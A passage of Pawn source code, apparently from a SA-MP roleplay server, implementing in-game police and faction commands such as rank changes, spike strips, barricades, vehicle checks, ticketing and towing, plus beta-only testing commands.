		if(rank > 6 || rank < 0) { SendClientMessage(playerid, COLOR_GREY, "   Don't go below number 0, or above number 6!"); return 1; }

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[playerid][pLeader] != PlayerInfo[giveplayerid][pFaction])
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   That person is not in your faction!");
				return 1;
			}

			if(rank > PlayerInfo[giveplayerid][pRank])
			{
				format(string, sizeof(string), "   You have been promoted to a higher rank by %s.", GetPlayerNameEx(playerid));
			}
			if(rank < PlayerInfo[giveplayerid][pRank])
			{
				format(string, sizeof(string), "   You have been demoted to a lower rank by %s.", GetPlayerNameEx(playerid));
			}
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

			format(string, sizeof(string), "%s has given %s rank %d in the %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), rank, GetFactionName(PlayerInfo[giveplayerid][pFaction]));
			Log("logs/faction.log", string);
			PlayerInfo[giveplayerid][pRank] = rank;
			format(string, sizeof(string), "   You have given %s rank %d.", GetPlayerNameEx(giveplayerid),rank);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command (leaders only)!");
	}
	return 1;
}

CMD:spikestrips(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pLeader] == 6)
	{
		if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pRank] >= 3)
		{
  			SendClientMessage(playerid, COLOR_WHITE, "Current deployed spikes:");
			for(new i, string[58 + MAX_PLAYER_NAME]; i < sizeof(SpikeStrips); i++)
			{
				if(SpikeStrips[i][sX] != 0) // Checking for next available ID.
				{
					format(string, sizeof(string), "HQ: Spike ID: %d | Deployed location: %s | Deployed by: %s", i, SpikeStrips[i][sDeployedAt], SpikeStrips[i][sDeployedBy]);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				}
 			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " You must be rank 3 or higher!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not a law enforcement officer.");
	}
	return 1;
}

CMD:deployspikes(playerid, params[])
{
    if(IsACop(playerid))
	{
		if(PlayerInfo[playerid][pRank] >= 3)
		{
			if(GetPlayerInterior(playerid) != 0)
			{
		    	SendClientMessage(playerid, COLOR_GREY, "You can't deploy spike strips in interiors.");
		    	return 1;
			}
			for(new i; i < sizeof(SpikeStrips); i++)
			{
				if(SpikeStrips[i][sX] == 0)
				{
					new
						Float: f_TempAngle,
						string[128];

					GetPlayerPos(playerid, SpikeStrips[i][sX], SpikeStrips[i][sY], SpikeStrips[i][sZ]);
					GetPlayerFacingAngle(playerid, f_TempAngle);
					SpikeStrips[i][sObjectID] = CreateDynamicObject(2899, SpikeStrips[i][sX], SpikeStrips[i][sY], SpikeStrips[i][sZ]-0.8, 0.0, 0.0, f_TempAngle);
					GetPlayer3DZone(playerid, SpikeStrips[i][sDeployedAt], MAX_ZONE_NAME);
					SpikeStrips[i][sDeployedBy] = GetPlayerNameEx(playerid);
					format(string,sizeof(string),"Spike ID: %d successfully created.", i);
					SendClientMessage(playerid, COLOR_WHITE, string);
					format(string, sizeof(string), "HQ: A spike has been deployed by %s at %s.", GetPlayerNameEx(playerid), SpikeStrips[i][sDeployedAt]);
					foreach(Player, x)
					{
						if(IsACop(x))
						{
							SendClientMessage(x, TEAM_BLUE_COLOR, string);
							if(PlayerInfo[x][pRank] >= 3)
							{
								SendClientMessage(x, COLOR_YELLOW, "You can remove a spike by typing /destroyspikes.");
							}
						}
					}
					return 1;
				}
    		}
			SendClientMessage(playerid, COLOR_WHITE, "Unable to spawn more strips, limit is 5.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " You must be rank 3 or higher!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not a law enforcement officer.");
	}
	return 1;
}

CMD:destroyspikes(playerid, params[])
{
	if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /destroyspikes [spikeid]");

    if(IsACop(playerid))
	{
		if(PlayerInfo[playerid][pRank] >= 3)
		{
			new id = strval(params);
			if(!(0 <= id <= sizeof(SpikeStrips)) || SpikeStrips[id][sX] == 0) {
				return SendClientMessage(playerid, COLOR_WHITE, "Invalid spike ID.");
			}
			else
			{
				new string[43 + MAX_PLAYER_NAME + MAX_ZONE_NAME];
				DestroyDynamicObject(SpikeStrips[id][sObjectID]);
				SpikeStrips[id][sX] = 0; SpikeStrips[id][sY] = 0; SpikeStrips[id][sZ] = 0;
				SpikeStrips[id][sObjectID] = INVALID_OBJECT_ID;
				format(string,sizeof(string),"Spike ID: %d successfully deleted.", id);
				SendClientMessage(playerid, COLOR_WHITE, string);
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: A spike has been destroyed by %s at %s.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
					}
				}
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " You must be rank 3 or higher!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not a law enforcement officer.");
	}
	return 1;
}

CMD:searchcar(playerid, params[])
{
    new string[128];
    if(!IsACop(playerid))
	{
        SendClientMessage(playerid, COLOR_GREY, "   You're not a Cop / FBI / Coastguard!");
        return 1;
    }
    new carid = GetPlayerVehicleID(playerid);
    new closestcar = GetClosestCar(playerid,carid);
    if(!IsPlayerInRangeOfVehicle(playerid, closestcar, 9.0))
	{
        SendClientMessage(playerid,COLOR_GREY,"You're not near any vehicles.");
        return 1;
    }
    foreach(Player, i)
	{
        new v = GetPlayerVehicle(i, closestcar);
        if(v != -1)
		{
            string[0] = 0;
            for(new x = 0; x < 3; x++)
			{
                if(PlayerVehicleInfo[i][v][pvWeapons][x] != 0)
				{
                    new
                        szWep[20];

                    GetWeaponName(PlayerVehicleInfo[i][v][pvWeapons][x], szWep, sizeof(szWep));
                    if(isnull(string)) format(string, sizeof(string), "* Trunk contains: %s", szWep);
                    else format(string, sizeof(string), "%s, %s", string, szWep);
                }
            }
            if(!isnull(string)) SendClientMessage(playerid, COLOR_WHITE, string);
            else SendClientMessage(playerid, COLOR_WHITE, "* Trunk contains: nothing.");
        }
    }
    return 1;
}

CMD:deploycade(playerid, params[])
{
    if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "You must be on foot to use this command.");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "You need to be at least rank 3 to use this command.");
			return 1;
		}
		if(GetPlayerInterior(playerid) != 0)
		{
		    SendClientMessage(playerid, COLOR_GREY, "You can't deploy barricades in interiors.");
		    return 1;
		}

		new string[128], Float:Position[4];
		for(new i; i<MAX_BARRICADES; i++)
		{
			if(Barricade[i] == 0)
			{
				GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
				GetPlayerFacingAngle(playerid, Position[3]);
				Barricade[i] = CreateDynamicObject(981, Position[0], Position[1], Position[2], 0.0, 0.0, Position[3]+180.0, -1, -1, -1, 200.0);
				SetPlayerPos(playerid, Position[0], Position[1]+4, Position[2]);
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: A barricade has been deployed by %s at %s.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
						if(PlayerInfo[x][pRank] >= 3)
						{
							SendClientMessage(x, COLOR_YELLOW, "You can remove a barricade by typing /destroycade.");
						}
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "All available barriers have been deployed.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	}
	return 1;
}

CMD:destroycade(playerid, params[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "You must be on foot to use this command.");
			return 1;
		}
		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2)
		{
			SendClientMessage(playerid, COLOR_GREY, "You need to be at least rank 3 to use this command.");
			return 1;
		}
		new string[128], Float:Position[3];
		for(new i; i<MAX_BARRICADES; i++)
		{
			GetDynamicObjectPos(Barricade[i], Position[0], Position[1], Position[2]);

			if(IsPlayerInRangeOfPoint(playerid, 5.0, Position[0], Position[1], Position[2]))
			{
				DestroyDynamicObject(Barricade[i]);
				Barricade[i] = 0;
				new zone[MAX_ZONE_NAME];
				GetPlayer3DZone(playerid, zone, sizeof(zone));
				format(string, sizeof(string), "HQ: A barricade has been destroyed by %s at %s.", GetPlayerNameEx(playerid), zone);
				foreach(Player, x)
				{
					if(IsACop(x))
					{
						SendClientMessage(x, TEAM_BLUE_COLOR, string);
					}
				}
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "You're not near any barricades.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	}
	return 1;
}

CMD:destroycades(playerid, params[])
{
	if(IsACop(playerid) || AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] >= 3 || PlayerInfo[playerid][pAdmin] >= 6) {
		if(IsPlayerInAnyVehicle(playerid) && AdminDuty[playerid] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "You must be on foot to use this command.");

		if(PlayerInfo[playerid][pRank] < 3 && PlayerInfo[playerid][pFaction] != 2 && AdminDuty[playerid] == 0)
			return	SendClientMessage(playerid, COLOR_GREY, "You need to be at least rank 3 to use this command.");

		new
			szMessage[128];

		for(new i; i < MAX_BARRICADES; i++) {
			DestroyDynamicObject(Barricade[i]);
			Barricade[i] = 0;
		}
		format(szMessage, sizeof(szMessage), "HQ: All barricades have been destroyed by %s.", GetPlayerNameEx(playerid));
		SendRadioMessage(1, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(2, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(3, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(5, TEAM_BLUE_COLOR, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	return 1;
}

CMD:vcheck(playerid, params[])
{
    if(IsACop(playerid))
	{
        new carid = GetPlayerVehicleID(playerid);
        new closestcar = GetClosestCar(playerid, carid);
        if(IsTrailerAttachedToVehicle(carid))
		{
            new carbeingtowed = GetVehicleTrailer(carid);
            foreach(Player, i)
			{
                new v = GetPlayerVehicle(i, carbeingtowed);
                if(v != -1)
				{
					new string[78 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Vehicle registration: %d | Name: %s | Owner: %s | Ticket: $%d.",carbeingtowed,GetVehicleName(PlayerVehicleInfo[i][v][pvId]),GetPlayerNameEx(i),PlayerVehicleInfo[i][v][pvTicket]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            for(new f = 0; f < MAX_FAMILY; f++)
			{
                new v = GetGangVehicle(f, carbeingtowed);
                if(v != -1)
                {
					new string[72 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Vehicle registration: %d | Name: %s | Owner: %s.",carbeingtowed,GetVehicleName(FamilyVehicleInfo[f][v][fvId]),FamilyInfo[f][FamilyLeader]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            SendClientMessage(playerid, COLOR_GRAD2, "This vehicle is not owned by anyone!");
        }
        else if(IsPlayerInRangeOfVehicle(playerid, closestcar, 9.0) && !IsTrailerAttachedToVehicle(carid))
		{
            foreach(Player, i)
			{
                new v = GetPlayerVehicle(i, closestcar);
                if(v != -1)
				{
					new string[78 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Vehicle registration: %d | Name: %s | Owner: %s | Ticket: $%d.",closestcar,GetVehicleName(PlayerVehicleInfo[i][v][pvId]),GetPlayerNameEx(i),PlayerVehicleInfo[i][v][pvTicket]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            for(new f = 0; f < MAX_FAMILY; f++)
			{
                new v = GetGangVehicle(f, closestcar);
                if(v != -1)
				{
					new string[72 + MAX_PLAYER_NAME];
                    format(string, sizeof(string), "Vehicle registration: %d | Name: %s | Owner: %s.",closestcar,GetVehicleName(FamilyVehicleInfo[f][v][fvId]),FamilyInfo[f][FamilyLeader]);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    return 1;
                }
            }
            SendClientMessage(playerid, COLOR_GRAD2, "This vehicle is not owned by anyone!");
        }
        else
		{
            SendClientMessage(playerid, COLOR_GRAD1, "ERROR: you're not towing a vehicle/near to another vehicle.");
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use this command.");
    }
    return 1;
}

CMD:vmdc(playerid, params[])
{
    if(IsACop(playerid)) {
        new
			string[128],
			giveplayerid;

        if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /vmdc [playerid/partofname]");

   		if(IsPlayerConnected(giveplayerid)) {
	        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "*** %s' Vehicles  ***", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_GRAD2, string);
	        for(new i; i < MAX_PLAYERVEHICLES; i++) {
				if(PlayerVehicleInfo[giveplayerid][i][pvModelId] >= 400) {
					if(PlayerVehicleInfo[giveplayerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID) {
						format(string, sizeof(string), "Vehicle registration: %d | Vehicle Name: %s | Ticket: $%d.",PlayerVehicleInfo[giveplayerid][i][pvId],GetVehicleName(PlayerVehicleInfo[giveplayerid][i][pvId]),PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					} else if(PlayerVehicleInfo[giveplayerid][i][pvImpounded]) {
						format(string, sizeof(string), "Vehicle registration: Voided (impounded) | Vehicle Name: %s | Ticket: $%d.",VehicleName[PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400],PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					} else if(PlayerVehicleInfo[giveplayerid][i][pvDisabled]) {
						format(string, sizeof(string), "Vehicle registration: Voided (disabled) | Vehicle Name: %s | Ticket: $%d.",VehicleName[PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400],PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					} else if(!PlayerVehicleInfo[giveplayerid][i][pvSpawned]) {
						format(string, sizeof(string), "Vehicle registration: Voided (stored) | Vehicle Name: %s | Ticket: $%d.",VehicleName[PlayerVehicleInfo[giveplayerid][i][pvModelId] - 400],PlayerVehicleInfo[giveplayerid][i][pvTicket]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
	    	}
	    	SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
   		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
    }
	return 1;
}

CMD:vticket(playerid, params[])
{
    if(IsACop(playerid))
    {
        if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /vticket [vehicle registration]");

        if(PlayerInfo[playerid][pTicketTime] != 0)
		{
            SendClientMessage(playerid, COLOR_GRAD2, "You must wait within a minute in order to use this command again!");
            return 1;
        }

        new Float: x, Float: y, Float: z, vehicleid = strval(params);
        GetVehiclePos(vehicleid, x, y, z);
        if(IsPlayerInRangeOfPoint(playerid, 5.0, x, y, z))
		{
            if(vehicleid != INVALID_VEHICLE_ID)
			{
                foreach(Player, i)
				{
                    new v = GetPlayerVehicle(i, vehicleid);
                    if(v != -1)
					{
						new string[62 + MAX_PLAYER_NAME];
                        PlayerVehicleInfo[i][v][pvTicket] += 1000;
                        PlayerInfo[playerid][pTicketTime] = 60;
                        format(string, sizeof(string), "You have issued a $1000 ticket on %s's %s.",GetPlayerNameEx(i),GetVehicleName(PlayerVehicleInfo[i][v][pvId]));
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        return 1;
                    }
                }
                for(new f = 0; f < MAX_FAMILY; f++)
				{
                    new v = GetGangVehicle(f, vehicleid);
                    if(v != -1)
					{
                        SendClientMessage(playerid, COLOR_WHITE, "You can't issue a ticket on a family owned vehicle!");
                        return 1;
                    }
                }
                SendClientMessage(playerid, COLOR_GRAD2, "This vehicle does not have any registration!");
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_GRAD2, "You need to be near such vehicle!");
        }
    }
    return 1;
}

CMD:tow(playerid, params[]) {
 	if(IsACop(playerid)) {
   		if(IsPlayerInAnyVehicle(playerid))
     	{
			new
				carid = GetPlayerVehicleID(playerid);

			if(IsATowTruck(carid))
			{
   				new
					closestcar = GetClosestCar(playerid, carid),
					v = GetCarDealershipVehicleId(carid);

				foreach(Player, i) {
					if(arr_Towing[i] == closestcar || (GetPlayerVehicleID(i) == closestcar && GetPlayerState(i) == 2)) return SendClientMessage(playerid, COLOR_GREY, "You can't tow a vehicle which is occupied, or in tow.");
				}
				if(v != -1)
					return SetVehicleToRespawn(closestcar);

       			if(GetDistanceToCar(playerid,closestcar) <= 8 && !IsTrailerAttachedToVehicle(carid)) {
					foreach(Player, i) {
						if(GetPlayerVehicle(i, closestcar) != -1) {

							new
								hKey;

							if(((hKey = PlayerInfo[i][pHouse]) != INVALID_HOUSE_ID) && IsPlayerInRangeOfPoint(playerid, 50.0, HouseInfo[hKey][hExteriorX], HouseInfo[hKey][hExteriorY], HouseInfo[hKey][hExteriorZ])
							||((hKey = PlayerInfo[i][pHouse2]) != INVALID_HOUSE_ID) && IsPlayerInRangeOfPoint(playerid, 50.0, HouseInfo[hKey][hExteriorX], HouseInfo[hKey][hExteriorY], HouseInfo[hKey][hExteriorZ])) {
								return SendClientMessage(playerid, COLOR_GREY, "This vehicle doesn't need to be towed.");
							}


						    if(ProxDetectorS(30.0,playerid,i))
								SendClientMessage(i, COLOR_LIGHTBLUE, "Someone is attempting to tow your vehicle away!");

							arr_Towing[playerid] = closestcar;
						    SendClientMessage(playerid, COLOR_GRAD2, "This player owned vehicle is available for impounding.");
      						return AttachTrailerToVehicle(closestcar,carid);
						}
					}
					SendClientMessage(playerid, COLOR_GRAD2, "This vehicle has no registration, it is available for impounding.");
					AttachTrailerToVehicle(closestcar,carid);
					arr_Towing[playerid] = closestcar;
					return 1;
     			}
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to tow with this vehicle.");
   		}
     	else SendClientMessage(playerid, COLOR_GRAD2, "You need to be inside a vehicle to use this command!");
	}
   	else SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command.");
	return 1;
}

CMD:untow(playerid, params[])
{
 	if(IsACop(playerid))
  	{
   		if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
     	{
      		SendClientMessage(playerid, COLOR_GRAD1,"You have unhooked the vehicle that you were towing.");
			arr_Towing[playerid] = INVALID_VEHICLE_ID;
			DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
     	}
      	else
       	{
        	SendClientMessage(playerid, COLOR_GRAD1,"You're currently not towing anything.");
        }
  	}
   	else
	{
 		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command.");
	}
	return 1;
}

CMD:forcetime(playerid, params[])
{
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "This isn't on the beta server!");

	if(isnull(params)) {
		new
		string[128],
		tmphour,
		tmpminute,
		tmpsecond;

		gettime(tmphour, tmpminute, tmpsecond);
		format(string, sizeof(string), "gettime(%d, %d, %d);", tmphour, tmpminute, tmpsecond);
		SendClientMessage(playerid, COLOR_WHITE, string);
		FixHour(tmphour);
		tmphour = shifthour;
		format(string, sizeof(string), "%d = %d", tmphour, shifthour);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if((tmphour > ghour) || (tmphour == 0 && ghour == 23))
		{
			format(string, sizeof(string), "if((%d > %d) || (%d == 0 && %d == 23))", tmphour, ghour, tmphour, ghour);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "The time is now %d:00.",tmphour);
			SendClientMessageToAllEx(COLOR_WHITE,string);
			ghour = tmphour;
			TotalUptime += 1;
			PayDay();

			SaveFamilies();
		}
	} else {
		new minute, hour;
		if(sscanf(params, "ii", hour, minute))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /forcetime [hour] [minute]");

		new
			string[128],
			tmphour,
			tmpminute,
			tmpsecond;

		gettime(tmphour, tmpminute, tmpsecond);
		format(string, sizeof(string), "gettime(%d, %d, %d);", tmphour, tmpminute, tmpsecond);
		SendClientMessage(playerid, COLOR_WHITE, string);
		FixHour(hour);
		hour = shifthour;
		format(string, sizeof(string), "%d = %d", tmphour, shifthour);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "if((%d > %d) || (%d == 0 && %d == 23))", hour, ghour, hour, ghour);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if((hour > ghour) || (hour == 0 && ghour == 23))
		{
			format(string, sizeof(string), "The time is now %d:00.",hour);
			SendClientMessageToAllEx(COLOR_WHITE,string);
			ghour = hour;
			TotalUptime += 1;
			PayDay();

			SaveFamilies();
		}
	}
	return 1;
}

CMD:testsaving(playerid, params[]) {
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "This isn't on the beta server!");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /testsaving [value]");

	new
	    iValue = strval(params);

	PlayerInfo[playerid][pLiveBanned] = iValue;
	PlayerInfo[playerid][pLevel] = iValue;
	PlayerInfo[playerid][pBanAppealer] = iValue;
	PlayerInfo[playerid][pGangMod] = iValue;
	PlayerInfo[playerid][pAge] = iValue;
	PlayerInfo[playerid][pSkin] = iValue;
	PlayerInfo[playerid][pConnectTime] = iValue;
	PlayerInfo[playerid][pRespect] = iValue;
	PlayerInfo[playerid][pNumber] = iValue;
	PlayerInfo[playerid][pGang] = iValue;
	PlayerInfo[playerid][pTriageTime] = iValue;
	PlayerInfo[playerid][pFaction] = iValue;
	PlayerInfo[playerid][pLeader] = iValue;
	PlayerInfo[playerid][pRank] = iValue;
	PlayerInfo[playerid][pJob] = iValue;
	PlayerInfo[playerid][pJob2] = iValue;
	PlayerInfo[playerid][pVip] = iValue;
	PlayerInfo[playerid][gPupgrade] = iValue;
	PlayerInfo[playerid][pSarmor] = iValue;
	PlayerInfo[playerid][pCash] = iValue;
	PlayerInfo[playerid][pBank] = iValue;
	PlayerInfo[playerid][pInsurance] = iValue;
	PlayerInfo[playerid][pCrimes] = iValue;
	PlayerInfo[playerid][pArrested] = iValue;
	PlayerInfo[playerid][pWantedLevel] = iValue;
	PlayerInfo[playerid][pHealth] = iValue;
	PlayerInfo[playerid][pArmor] = iValue;
	PlayerInfo[playerid][pPot] = iValue;
	PlayerInfo[playerid][pCrack] = iValue;
	PlayerInfo[playerid][pPackages] = iValue;
	PlayerInfo[playerid][pCrates] = iValue;
	PlayerInfo[playerid][pRadio] = iValue;
	PlayerInfo[playerid][pRadioFreq] = iValue;
	PlayerInfo[playerid][pMats] = iValue;
	PlayerInfo[playerid][pRope] = iValue;
	PlayerInfo[playerid][pCigar] = iValue;
	PlayerInfo[playerid][pSprunk] = iValue;
	PlayerInfo[playerid][pSpraycan] = iValue;
	PlayerInfo[playerid][pHouse] = iValue;
	PlayerInfo[playerid][pHouse2] = iValue;
	PlayerInfo[playerid][pRenting] = iValue;
	PlayerInfo[playerid][pInt] = iValue;
	PlayerInfo[playerid][pVW] = iValue;
	PlayerInfo[playerid][pJailed] = iValue;
	PlayerInfo[playerid][pJailTime] = iValue;
	PlayerInfo[playerid][pPayCheck] = iValue;
	PlayerInfo[playerid][pPayReady] = iValue;
	PlayerInfo[playerid][pDetSkill] = iValue;
	PlayerInfo[playerid][pLawSkill] = iValue;
	PlayerInfo[playerid][pSexSkill] = iValue;
	PlayerInfo[playerid][pDrugsSkill] = iValue;
	PlayerInfo[playerid][pSmugSkill] = iValue;
	PlayerInfo[playerid][pArmsSkill] = iValue;
	PlayerInfo[playerid][pMechSkill] = iValue;
	PlayerInfo[playerid][pFishSkill] = iValue;
	PlayerInfo[playerid][pBoxSkill] = iValue;
	PlayerInfo[playerid][pTruckSkill] = iValue;
	PlayerInfo[playerid][pCarSkill] = iValue;
	PlayerInfo[playerid][pLawyerTime] = iValue;
	PlayerInfo[playerid][pLawyerFreeTime] = iValue;
	PlayerInfo[playerid][pDrugsTime] = iValue;
	PlayerInfo[playerid][pMechTime] = iValue;
	PlayerInfo[playerid][pSexTime] = iValue;
	PlayerInfo[playerid][pCarTime] = iValue;
	PlayerInfo[playerid][pFishes] = iValue;
	PlayerInfo[playerid][pBiggestFish] = iValue;
	PlayerInfo[playerid][pWSeeds] = iValue;
	PlayerInfo[playerid][pFightStyle] = iValue;
	PlayerInfo[playerid][pScrewdriver] = iValue;
	PlayerInfo[playerid][pSmslog] = iValue;
	PlayerInfo[playerid][pWristwatch] = iValue;
	PlayerInfo[playerid][pTire] = iValue;
	PlayerInfo[playerid][pFirstaid] = iValue;
	PlayerInfo[playerid][pRccam] = iValue;
	PlayerInfo[playerid][pReceiver] = iValue;
	PlayerInfo[playerid][pGPS] = iValue;
	PlayerInfo[playerid][pSweep] = iValue;
	PlayerInfo[playerid][pSweepLeft] = iValue;
	PlayerInfo[playerid][pCarLic] = iValue;
	PlayerInfo[playerid][pFlyLic] = iValue;
	PlayerInfo[playerid][pBoatLic] = iValue;
	PlayerInfo[playerid][pFishLic] = iValue;
	PlayerInfo[playerid][pGunLic] = iValue;
	PlayerInfo[playerid][pDivision] = iValue;
	PlayerInfo[playerid][pTicketTime] = iValue;
	PlayerInfo[playerid][pHeadValue] = iValue;
	PlayerInfo[playerid][pC4] = iValue;
	PlayerInfo[playerid][pC4Used] = iValue;
	PlayerInfo[playerid][pBombs] = iValue;
	PlayerInfo[playerid][pCHits] = iValue;
	PlayerInfo[playerid][pFHits] = iValue;
	PlayerInfo[playerid][pAcceptReport] = iValue;
	PlayerInfo[playerid][pTrashReport] = iValue;
	PlayerInfo[playerid][pAccent] = iValue;
	PlayerInfo[playerid][pNMute] = iValue;
	PlayerInfo[playerid][pNMuteTotal] = iValue;
	PlayerInfo[playerid][pADMute] = iValue;
	PlayerInfo[playerid][pADMuteTotal] = iValue;
	PlayerInfo[playerid][pRMuted] = iValue;
	PlayerInfo[playerid][pRMutedTotal] = iValue;
	PlayerInfo[playerid][pRMutedTime] = iValue;
	PlayerInfo[playerid][pSpeedo] = iValue;
	PlayerInfo[playerid][pGCMuted] = iValue;
	PlayerInfo[playerid][pGCMutedTime] = iValue;
	PlayerInfo[playerid][pCallsAccepted] = iValue;
	PlayerInfo[playerid][pPatientsDelivered] = iValue;
	PlayerInfo[playerid][pTriageTime] = iValue;
	PlayerInfo[playerid][pRMutedTime] = iValue;
	PlayerInfo[playerid][pRMutedTotal] = iValue;
	PlayerInfo[playerid][pPatientsDelivered] = iValue;
	PlayerInfo[playerid][pRefTokens] = iValue;
	PlayerInfo[playerid][pRefTokensOffline] = iValue;
	PlayerInfo[playerid][pHelper] = iValue;
	return 1;
}

CMD:lspddiv(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1) {
		new
			string[128],
			giveplayerid,
			division;

		if(sscanf(params, "ud", giveplayerid, division)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /lspddiv [playerid/partofname] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 1 (None), 2 (DET), 3 (TE), 4 (FTO), 5 (SWAT) and 6 (IA).");
			return 1;
		}

		if(PlayerInfo[playerid][pRank] >= 4) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pFaction] == 1) {
					if(division == 1) {
						PlayerInfo[giveplayerid][pDivision] = 1;
						format(string, sizeof(string), "You have been kicked from your division by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have kicked %s out of their division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 2) {
						PlayerInfo[giveplayerid][pDivision] = 2;
						format(string, sizeof(string), "You're now in the Detective division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s into the Detective division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 3) {
						PlayerInfo[giveplayerid][pDivision] = 3;
						format(string, sizeof(string), "You're now in the Traffic Enforcement division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s into the Traffic Enforcement division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 4) {
						PlayerInfo[giveplayerid][pDivision] = 4;
